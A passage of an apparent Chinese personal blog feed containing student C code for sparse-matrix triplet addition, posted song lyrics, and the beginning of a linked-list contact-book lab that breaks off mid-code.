class="number">2</span>];</span><br><span class="line">        i++;k++; </span><br><span class="line">    &#125;</span><br><span class="line">    c[<span class="number">0</span>][<span class="number">0</span>]=a[<span class="number">0</span>][<span class="number">0</span>];</span><br><span class="line">    c[<span class="number">0</span>][<span class="number">1</span>]=a[<span class="number">0</span>][<span class="number">1</span>];</span><br><span class="line">    c[<span class="number">0</span>][<span class="number">2</span>]=k<span class="number">-1</span>; </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//将普通矩阵存储转换成 三元组 的 存储结构</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change_matrix</span><span class="params">(matrix *A,spmatrix B)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,k;</span><br><span class="line">    k = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>;i &lt; A-&gt;m; i++)</span><br><span class="line">        <span class="keyword">for</span>(j = <span class="number">0</span>;j &lt; A-&gt;n; j++)</span><br><span class="line">            <span class="keyword">if</span>(A-&gt;data[i][j] != <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                B[k][<span class="number">0</span>] = i;</span><br><span class="line">                B[k][<span class="number">1</span>] = j;</span><br><span class="line">                B[k][<span class="number">2</span>] = A-&gt;data[i][j];</span><br><span class="line">                k++;</span><br><span class="line">            &#125;</span><br><span class="line">    B[<span class="number">0</span>][<span class="number">0</span>] = A-&gt;m;</span><br><span class="line">    B[<span class="number">0</span>][<span class="number">1</span>] = A-&gt;n;</span><br><span class="line">    B[<span class="number">0</span>][<span class="number">2</span>] = k<span class="number">-1</span>;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;三元组矩阵 展示：\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(i &lt;= B[<span class="number">0</span>][<span class="number">2</span>])</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d%5d%5d\n&quot;</span>,B[i][<span class="number">0</span>],B[i][<span class="number">1</span>],B[i][<span class="number">2</span>]);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//创建矩阵</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(<span class="keyword">int</span> r,<span class="keyword">int</span> w,matrix *s)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i,j,data;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入数据：\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;r;i++)</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;w;j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;data);</span><br><span class="line">            s-&gt;data[i][j] = data;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;矩阵展示：\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;r;i++)</span><br><span class="line">        &#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;w;j++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>,s-&gt;data[i][j]);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    s-&gt;m = r;</span><br><span class="line">    s-&gt;n = w;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//主函数</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"> </span>&#123;</span><br><span class="line">    matrix p,q;</span><br><span class="line">    spmatrix a,b,c;</span><br><span class="line">    <span class="keyword">int</span> r,w,i;</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;请输入矩阵的 行 与 列：&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>,&amp;r,&amp;w);</span><br><span class="line">    create(r,w,&amp;p);</span><br><span class="line">    create(r,w,&amp;q);</span><br><span class="line">    change_matrix(&amp;p,a);</span><br><span class="line">    change_matrix(&amp;q,b);</span><br><span class="line">    i = <span class="number">0</span>;</span><br><span class="line">    add(a,b,c);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;进行加法运算后的 三元组矩阵 展示：\n&quot;</span>); </span><br><span class="line">    <span class="keyword">while</span>(i &lt;= c[<span class="number">0</span>][<span class="number">2</span>])&#123; </span><br><span class="line">         <span class="built_in">printf</span>(<span class="string">&quot;%d%5d%5d\n&quot;</span>,c[i][<span class="number">0</span>],c[i][<span class="number">1</span>],c[i][<span class="number">2</span>]);</span><br><span class="line">      i++;</span><br><span class="line"> &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/10/22/9rquXIPgvZ8wTYm.png" alt="image-20211022203244329"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="数据结构" scheme="https://xizhi-future.github.io/categories/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
    
  </entry>
  
  <entry>
    <title>像真的一样</title>
    <link href="https://xizhi-future.github.io/2021/10/15/%E5%83%8F%E7%9C%9F%E7%9A%84%E4%B8%80%E6%A0%B7/"/>
    <id>https://xizhi-future.github.io/2021/10/15/%E5%83%8F%E7%9C%9F%E7%9A%84%E4%B8%80%E6%A0%B7/</id>
    <published>2021-10-15T09:01:08.000Z</published>
    <updated>2021-10-15T09:05:02.271Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>你习惯 可能会幸福的预感</p><p>你期盼 等暧昧过完 能改写身份这一栏</p><p>你鼻酸 就算都与你无关</p><p>他心烦 你跟着想要呐喊</p><p>恋人们的手说放就放</p><p>知己就没分手的情况</p><p>能在彼此身旁</p><p>你最擅长模仿 像真的一样</p><p>是伪装或武装 用友情来匿藏</p><p>你多想 躺一躺 他肩膀</p><p>你最擅长模仿 像真的坚强</p><p>孤独无尽漫长 背负着一个谎</p><p>他清场 他怯场 他离场 你都是暖场</p><p>边拐弯 打听关于爱的答案</p><p>边感叹 感情的艰难 却对感情避而不谈</p><p>另一半 若像是太阳一般</p><p>天一寒 怎么向你来取暖</p><p>恋人们的手说放就放</p><p>遗憾转身就遗忘</p><p>你还在他身旁</p><p>你最擅长模仿 像真的一样</p><p>是伪装或武装 用友情来匿藏</p><p>你多想 躺一躺 他肩膀</p><p>你最擅长模仿 像真的坚强</p><p>孤独无尽漫长 背负着一个谎</p><p>他清场 他怯场 他离场 你都是暖场</p><p>消音的话 只会更强化 不能没有他</p><p>你最擅长模仿 像真的一样</p><p>是伪装或武装 用友情来匿藏</p><p>你多想 躺一躺 他肩膀</p><p>你最擅长模仿 像真的坚强</p><p>孤独无尽漫长 背负着一个谎</p><p><strong>他清场 他怯场 他离场 你都是暖场</strong></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="音乐分享" scheme="https://xizhi-future.github.io/categories/%E9%9F%B3%E4%B9%90%E5%88%86%E4%BA%AB/"/>
    
    
  </entry>
  
  <entry>
    <title>数据结构第一次实验-简易通讯录</title>
    <link href="https://xizhi-future.github.io/2021/10/15/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C%20---%20%E9%80%9A%E8%AE%AF%E5%BD%95/"/>
    <id>https://xizhi-future.github.io/2021/10/15/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E7%AC%AC%E4%B8%80%E6%AC%A1%E5%AE%9E%E9%AA%8C%20---%20%E9%80%9A%E8%AE%AF%E5%BD%95/</id>
    <published>2021-10-15T08:57:15.000Z</published>
    <updated>2021-10-15T09:04:53.240Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="数据结构第一次实验-—-简易通讯录"><a href="#数据结构第一次实验-—-简易通讯录" class="headerlink" title="数据结构第一次实验 — 简易通讯录"></a>数据结构第一次实验 — 简易通讯录</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">phone</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> ID[<span class="number">15</span>];  <span class="comment">//编号</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">20</span>]; <span class="comment">//姓名</span></span><br><span class="line">    <span class="keyword">char</span> sex[<span class="number">5</span>];  <span class="comment">//性别</span></span><br><span class="line">    <span class="keyword">char</span> tele[<span class="number">20</span>];<span class="comment">//电话</span></span><br><span class="line">    <span class="keyword">char</span> add[<span class="number">30</span>]; <span class="comment">//住址</span></span><br><span class="line">    <span class="keyword">char</span> group[<span class="number">20</span>];<span class="comment">//分组</span></span><br><span class="line">&#125;Person;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">List</span>&#123;</span></span><br><span class="line">    Person data;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">List</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;List;</span><br><span class="line"></span><br><span class="line">List *L = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//一、初始化通讯录</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Init_List</span><span class="params">()</span></span>&#123;</span><br><span class="line">    L = (List*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line">    L-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;初始化通讯录成功！\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//二、创建 通讯录（前插法）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Creat_List_front</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *node;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;<span class="comment">// 插入 记录 计数</span></span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">1</span>;<span class="comment">//作为是否继续录入的标志</span></span><br><span class="line">    <span class="keyword">while</span>(flag)&#123;</span><br><span class="line">        count++;</span><br><span class="line">        node = (List*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;录入第%d条记录：\n&quot;</span>,count);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.ID));</span><br><span class="line">        <span class="comment">//判断 ID 是否重复</span></span><br><span class="line">        List *p = L-&gt;next;  <span class="comment">//由于是前插，则将 当前插入的 ID 与 链表中后一位进行比较</span></span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strcmp</span>(p-&gt;data.ID,node-&gt;data.ID) == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;ID重复，请重新进行输入！\n&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：&quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.ID));</span><br><span class="line">            &#125;<span class="keyword">else</span></span><br><span class="line">                p = p-&gt;next;   <span class="comment">//遍历所有元素进行比较</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.name));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;性别（女：F  男：M）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.sex));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;电话（11位）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.tele));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.add));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;分组（朋友、家人、同学等）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.group));</span><br><span class="line">        <span class="comment">//前插</span></span><br><span class="line">        node-&gt;next = L-&gt;next;</span><br><span class="line">        L-&gt;next = node;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;是否继续录入？（1.继续 0.完成录入）&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;flag);</span><br><span class="line">        <span class="keyword">if</span>(flag==<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//三、创建 通讯录（尾插法）</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Creat_List_behind</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List *node,*tail;</span><br><span class="line">    tail = L;</span><br><span class="line">    <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> flag = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(flag)&#123;</span><br><span class="line">        count++;</span><br><span class="line">        node = (List*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(List));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;录入第%d条记录：\n&quot;</span>,count);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.ID));</span><br><span class="line">        <span class="comment">//判断 ID 是否重复</span></span><br><span class="line">        List *p = L-&gt;next;  <span class="comment">//由于是前插，则将 当前插入的 ID 与 链表中后一位进行比较</span></span><br><span class="line">        <span class="keyword">while</span>(p)&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">strcmp</span>(p-&gt;data.ID,node-&gt;data.ID) == <span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;ID重复，请重新进行输入！\n&quot;</span>);</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;ID（编号）：&quot;</span>);</span><br><span class="line">                <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,&amp;(node-&gt;data.ID));</span><br><span class="line">            &#125;<span class="keyword">else</span></span><br><span class="line">                p = p-&gt;next;   <span class="comment">//遍历所有元素进行比较</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;姓名：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.name));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;性别（女：F  男：M）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.sex));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;电话（11位）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.tele));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;住址：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.add));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;分组（朋友、家人、同学等）：&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,(node-&gt;data.group));</span><br><span class="line">        <span class="comment">//尾插</span></span><br><span class="line">        tail-&gt;next = node;</span><br><span class="line">        node-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        tail = node;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;是否继续录入？（1.继续 0.完成录入）&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;flag);</span><br><span class="line">        <span class="keyword">if</span>(flag == <span 